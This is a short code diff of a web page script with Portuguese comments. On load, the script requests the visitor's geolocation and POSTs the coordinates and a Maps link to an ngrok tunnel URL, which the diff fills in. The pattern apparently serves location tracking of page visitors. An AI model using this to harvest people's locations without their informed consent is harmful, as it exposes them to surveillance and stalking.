@@ -29,6 +29,7 @@
   </div>
 
   <script>
+    // Ação de carregar a localização do usuário
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
@@ -37,23 +38,22 @@
       }
     });
 
+    // Definir a data no formato dd/mm/aaaa
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
-
     const dataFormatada = `${dia}/${mes}/${ano}`;
-
     document.getElementById("data-atual").textContent = dataFormatada;
 
-    console.log(dataAtual)
-
+    // Função que envia a localização para o servidor
     function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("NGROK_SERVER/send-location", {
+      // Enviar dados para o servidor usando ngrok
+      fetch("https://9714-2804-d59-b631-5500-4c99-52a8-a970-e581.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -71,6 +71,7 @@
         });
     }
 
+    // Função de erro ao obter a localização
     function handleError(error) {
       alert("Erro ao obter a localização: " + error.message);
     }
